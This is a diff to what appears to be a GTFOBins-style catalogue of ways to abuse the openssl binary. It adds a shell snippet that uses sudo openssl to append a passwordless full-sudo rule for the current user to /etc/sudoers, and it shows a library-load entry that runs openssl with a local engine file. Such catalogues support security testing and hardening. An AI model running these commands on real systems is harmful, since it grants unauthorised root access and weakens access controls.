@@ -28,6 +28,16 @@ functions:
       sudo:
       suid:
       unprivileged:
+  - code: |-
+      LFILE="/etc/sudoers"
+      TMPFILE=$(mktemp)
+      PAYLOAD="$(id -un) ALL=(ALL:ALL) NOPASSWD: ALL"
+
+      sudo openssl enc -in "$LFILE" > "$TMPFILE" && echo "$PAYLOAD" >> "$TMPFILE" && sudo openssl enc -in "$TMPFILE" -out "$LFILE"
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
   library-load:
   - code: |-
       openssl req -engine ./lib.so
